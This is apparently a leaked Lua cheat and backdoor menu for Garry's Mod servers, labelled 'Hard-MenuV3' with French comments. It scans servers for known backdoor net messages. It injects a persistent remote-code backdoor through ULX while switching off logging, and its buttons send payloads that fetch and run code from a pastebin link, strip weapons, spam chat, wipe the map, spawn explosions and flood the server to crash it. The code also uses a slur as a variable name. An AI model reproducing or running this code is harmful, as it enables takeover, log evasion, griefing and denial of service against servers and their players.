MsgC (Color( 255, 0, 0 ), [[  =======================================================================================================================
  
 /$$   /$$                           /$$ /$$      /$$                                      /$$$$$$                               
| $$  | $$                          | $$| $$$    /$$$                                     /$$__  $$                              
| $$  | $$  /$$$$$$   /$$$$$$   /$$$$$$$| $$$$  /$$$$  /$$$$$$  /$$$$$$$  /$$   /$$      | $$  \__/  /$$$$$$   /$$$$$$   /$$$$$$ 
| $$$$$$$$ |____  $$ /$$__  $$ /$$__  $$| $$ $$/$$ $$ /$$__  $$| $$__  $$| $$  | $$      | $$$$     /$$__  $$ /$$__  $$ /$$__  $$
| $$__  $$  /$$$$$$$| $$  \__/| $$  | $$| $$  $$$| $$| $$$$$$$$| $$  \ $$| $$  | $$      | $$_/    | $$  \__/| $$$$$$$$| $$$$$$$$
| $$  | $$ /$$__  $$| $$      | $$  | $$| $$\  $ | $$| $$_____/| $$  | $$| $$  | $$      | $$      | $$      | $$_____/| $$_____/
| $$  | $$|  $$$$$$$| $$      |  $$$$$$$| $$ \/  | $$|  $$$$$$$| $$  | $$|  $$$$$$/      | $$      | $$      |  $$$$$$$|  $$$$$$$
|__/  |__/ \_______/|__/       \_______/|__/     |__/ \_______/|__/  |__/ \______/       |__/      |__/       \_______/ \_______/
                                                                                                                                 
                                                                                                                                                                                                                                 
 ]])

MsgC (Color( 255, 0, 0 ), [[                            

leaked by sparks!

======================================================================================================================= ]])
  
local Authorized = LocalPlayer():SteamID()
if Authorized == "STEAM_0:1:219919521"
or Authorized == "STEAM_0:1:219919521" 
										


then

local n = net
local s = net.Start
local ss = net.WriteString
local stc = net.Send
local hp = http.Post
local HardMenuFree = "";
local vgui = vgui;         
local surface = surface;       
local render = render;         
local Color = Color;       
local input = input;       
local hook = hook;         
local next = next;         
local timer = timer;  
local GetConVarNumber = GetConVarNumber;     
local util = util;         
local player = player;         
local Vector = Vector;         
local Angle = Angle;       
local FindMetaTable = FindMetaTable;       
local team = team;         
local LocalPlayer = LocalPlayer;       
local draw = draw;             
local debug = debug;       
local table = table;       
local Entity = Entity;         
local ScrW, ScrH = ScrW, ScrH;         
local RunConsoleCommand = RunConsoleCommand;       
local GAMEMODE = GAMEMODE;         
local CurTime = CurTime;       
local cam = cam;
local silent = CreateClientConVar("silent", 0, false, false);
totalExploits = 0
BackdoorsFound = 0
local ply = LocalPlayer()


function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

-- Exploit 1
function removeAll() -- Strips all Players
    for k,v in pairs(player.GetAll()) do
        stripPlayer(v)
    end
end

function stripPlayer(ply) -- Strip player function
    if ply:IsPlayer() then
        for k,v in pairs(ply:GetWeapons()) do
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( v )
            net.SendToServer()
        end
    end
end

GRADIENT_HORIZONTAL = 0;
GRADIENT_VERTICAL = 1;
function draw.LinearGradient(x,y,w,h,from,to,dir,res)
    dir = dir or GRADIENT_HORIZONTAL;
    if dir == GRADIENT_HORIZONTAL then res = (res and res <= w) and res or w;
    elseif dir == GRADIENT_VERTICAL then res = (res and res <= h) and res or h; end
    for i=1,res do
        surface.SetDrawColor(
            Lerp(i/res,from.r,to.r),
            Lerp(i/res,from.g,to.g),
            Lerp(i/res,from.b,to.b),
            Lerp(i/res,from.a,to.a)
        );
        if dir == GRADIENT_HORIZONTAL then surface.DrawRect(x + w * (i/res), y, w/res, h );
        elseif dir == GRADIENT_VERTICAL then surface.DrawRect(x, y + h * (i/res), w, h/res ); end
    end
end

---------------------
--  SPLOIT NOTIFY  --
---------------------
function SploitNotify(text)
    local notify = vgui.Create( "DPanel" )
    notify:SetSize( 500, 50 )
    notify:SetPos( ScrW() - 200, -50 )
    notify.Paint = function(self, w, h)
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
    draw.SimpleText( text, "Title", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end
    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
    timer.Simple( 3, function()
    notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
end);end) end
---------------------

local function playSound(url)
    sound.PlayURL(url, '', function( station ) 
        if ( IsValid( station ) ) then
        station:SetPos( LocalPlayer():GetPos() )
        station:Play()
        end
    end)
end

hook.Add("Think", "RAINBOWPLAYER", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end)



-- CHECKER
    if( ValidNetString("memeDoor") ) then
        HardMenuFree = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
        HardMenuFree = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        HardMenuFree = "DarkRP_AdminWeapons"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        HardMenuFree = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        HardMenuFree = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        HardMenuFree = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        HardMenuFree = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        HardMenuFree = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        HardMenuFree = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        HardMenuFree = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        HardMenuFree = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        HardMenuFree = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        HardMenuFree = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        HardMenuFree = "ULXQUERY2"
    else
    end

    if HardMenuFree == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Aucune backdoor :(" )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 0, 255, 0 ), "Backdoor trouvÃ©! :D La backdoor est : ".. HardMenuFree )
            -- Auto shut down ULX Logs
            if GetConVarNumber("silent") == 1 then
                net.Start(HardMenuFree)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(HardMenuFree)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("ULX Logs disabled." )
                end)
            end
    end
--END CHECKER

--[[-----------
LE STRIP 
--------------]]
function jefaitlenculer() 
    for k,v in pairs(player.GetAll()) do
        nikelesrageux(v)
    end
end

--[[-----------
LE STRIP
--------------]] 


-----------------------------------------------
--     Check Backdoors (2) (jesus_scanbd)    --
-----------------------------------------------

function checkbackdoors()
    SploitNotify("Backdoor trouvÃ©: ".. HardMenuFree )
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 127, 255, 0 ), "Net changÃ© Ã  - ".. HardMenuFree  )
	
end

function Inject()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), " Injecting..." )
    if ( ply:IsSuperAdmin() ) then
        timer.Simple( 3, function() 
            if( ValidNetString("SessionBackdoor") ) then

            else
                RunConsoleCommand( "ulx", "logecho", "0" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('SessionBackdoor')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('SessionBackdoor') net.Receive('SessionBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                RunConsoleCommand( "ulx", "logecho", "1" )
                chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), " InjÃ©ctÃ© avec succÃ¨s !" )
            end
        end )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), " Erreur ! Vous n'Ãªtes pas SUPERADMIN !" )
    end
    if( ValidNetString("SessionBackdoor") ) then
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), " La backdoor est dÃ©jÃ  prÃ©sente." )
    end
end

function bhop()
local AddHook = dismay and dismay.AddHook or hook and hook.Add or function() print("fuck i missed") end;
AddHook("CreateMove", "BHOP", function(cmd)
        if (cmd:KeyDown(IN_JUMP)) then
                if(cmd:GetMouseX() < 0) then
                        cmd:SetSideMove(-10000);
                elseif(cmd:GetMouseX() > 0) then
                        cmd:SetSideMove(10000);
                end
        if (LocalPlayer():IsOnGround()) then
                cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
                        return;
        end
end
cmd:RemoveKey(IN_JUMP);
end)
end

surface.CreateFont("Font", {
font = "Segoe UI Light",
size = 21,
weight = 300
})
surface.CreateFont("CheckFont", {
font = "Segoe UI Light",
size = 17,
weight = 300
})

surface.CreateFont("Target", {
font = "Segoe UI Light",
size = 15,
weight = 300
})

surface.CreateFont( "Title", {
        font = "Lato Light",
        size = 30,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
} )

surface.CreateFont( "tamere", {
        font = "Roboto",
        size = 150,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
		bold = true,
} )

surface.CreateFont( "Welcome", {
        font = "Lato Light",
        size = 25,
        weight = 10,
        antiaalias = true,
        strikeout = false,
        additive = true,
} )

function Hard()
local Menu = vgui.Create("DFrame")
Menu:SetSize(900, 700)
Menu:Center()
Menu:SetTitle("")
Menu:MakePopup()
Menu:ShowCloseButton(false) 
Menu.Paint = function(self, w, h)
surface.SetDrawColor( 30, 30 , 30 )
surface.DrawRect( 0, 0, Menu:GetWide(), Menu:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Menu:GetWide(), Menu:GetTall() )

    draw.DrawText( "|Hard-MenuVF|                                                                                                                               |Created by Thomas Baguettes|", "Font", 10, 2, Color(math.random(900),math.random(900),math.random(900))) 


end

local Close = vgui.Create("DButton", Menu)
Close:SetPos( 842, 1 )
Close:SetSize( 53, 20 )
Close:SetText( "" )
function Close:Paint( w, h )
    draw.RoundedBoxEx( 4, 0, 0, w, h, Color(255,0,0) )
end

Close.DoClick = function()
    Menu:Close()  
end 


--------------------------------------------------------------
local Tabs = vgui.Create( "DPropertySheet", Menu )
Tabs:Dock( FILL )
Tabs:DockPadding( 5, 5, 0, 0)
Tabs.Paint = function (self, w, h)
for k, v in pairs(Tabs.Items) do
    if (!v.Tab) then continue end
   
    v.Tab.Paint = function(self,w,h)
         draw.LinearGradient( 0, 0, w, h, Color(20, 20, 20), Color(30, 30, 30), GRADIENT_VERTICAL );
         surface.SetDrawColor(15, 15, 15)
         surface.DrawOutlinedRect( 0, 0, v.Tab:GetWide(), v.Tab:GetTall() )
    end
end
end
 
local Controller = vgui.Create( "DPanel", Tabs )
    Controller.Paint = function( self, w, h )
        draw.RoundedBox(25, 0, 25, w, h, (HSVToColor( CurTime() % 6 * 60, 1, 1 )))
    end
Tabs:AddSheet( "Controller", Controller )
 

local Targets = vgui.Create( "DPanel", Tabs )
    Targets.Paint = function( self, w, h )
        draw.RoundedBox(25, 0, 25, w, h, (HSVToColor( CurTime() % 6 * 60, 1, 1 )))
    end
Tabs:AddSheet( "Targets", Targets )

local Misc = vgui.Create( "DPanel", Tabs )
    Misc.Paint = function( self, w, h )
        draw.RoundedBox(25, 0, 25, w, h, (HSVToColor( CurTime() % 6 * 60, 1, 1 )))
    end
Tabs:AddSheet( "Misc", Misc )


local Controller = vgui.Create( "DScrollPanel", Controller )
Controller:Dock( FILL )
 
local Targets = vgui.Create( "DScrollPanel", Targets )
Targets:Dock( FILL )

local Misc = vgui.Create( "DScrollPanel", Misc )
Misc:Dock( FILL )
--------------------------------------------------------------
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 60 )
Macro:SetText( "SSV 2 (base)" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 1 (base) activÃ©" )
    SploitNotify("Super Spam Visuel/Sonore activÃ©")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "SSV 1 (Disco)" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/uBwmd6WK\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 2 (Disco) activÃ©" )
    SploitNotify("Super Spam Visuel/Sonore activÃ©")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 6 - DISCORD" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString("timer.Create( \"tchat6\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"GO DISCORD OU TON SERV R.I.P https://discordapp.com/invite/Eqyj6KY\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Menu Spam tchat" )
    SploitNotify("SPAM activÃ© !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 390 ) 
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam - STOP SPAM" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString([[
timer.Remove ("tchat1")
timer.Remove ("tchat2")
timer.Remove ("tchat3")
timer.Remove ("tchat4")
timer.Remove ("tchat5")
timer.Remove ("tchat6")
]])
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Stop spam" )
    SploitNotify("SPAM d�sactiv�")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 20, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 3 - Seized" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString("timer.Create( \"tchat1\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Seized by Thomas Baguettes est la Team\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Spam 1 - Seized activÃ©" )
    SploitNotify("SPAM activÃ© !")
    surface.PlaySound("buttons/blip1.wav") 
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 300 ) 
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 ) 
Macro:SetText( "Spam 4 - MERCI" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString("timer.Create( \"tchat4\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"MERCI POUR TES DATA ET ADDONS :D\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3|", "] ", Color( 255, 255, 255 ), "Spam 3 - Get dicked activÃ©" )
    SploitNotify("SPAM activÃ© !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 330 ) 
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 5 - R.I.P" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString("timer.Create( \"tchat5\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"RIP RIP RIP RIP RIP\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3|", "] ", Color( 255, 255, 255 ), "Spam 5 - RIP activÃ©    " )
    SploitNotify("SPAM activÃ© !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 1 - ALL" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString("timer.Create( \"tchat1\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"RIP RIP RIP RIP RIP CREATED BY THOMAS BAGUETTES MERCI POUR TES DATA ET ADDONS :D Tu t'es bien fais niquer ! :) Seized by Thomas Baguettes est la Team CODDER AVEC QUL\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3|", "] ", Color( 255, 255, 255 ), "Spam 5 - RIP activÃ©    " )
    SploitNotify("SPAM activÃ© !")
    surface.PlaySound("buttons/blip1.wav") 
end

--[[]]
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "2D Players" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "2D Players activÃ©" )
	    SploitNotify("2D players activÃ© !")
    surface.PlaySound("buttons/blip1.wav") 
        net.Start(HardMenuFree)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 140, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "1000â‚¬ toutes les 0.1sec tous les joueurs" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(1000) end) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "1000^â‚¬ toutes les 0.1sec activÃ©." )
    SploitNotify(":D MONEY")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Cleanup" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Map clean up. activÃ©." )
    SploitNotify("Map cleanup activÃ©.!")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 140, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Shutdown" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "timer.Create( \"spamlol\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \"Owned by Thomas\") end end)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Arret..." )
    SploitNotify("RIP le serveur :)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Bombe qui explo" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local faggot = [[
            hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" ) 
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
                    explode:Spawn() 
                    explode:SetKeyValue( "iMagnitude", "500" ) 
                    explode:Fire( "Explode", 0, 0 ) 
                end)  
]]
net.Start(HardMenuFree)
net.WriteString( faggot )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Bombe qui explo activ?" )
    SploitNotify("Bombe qui explo activ? !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
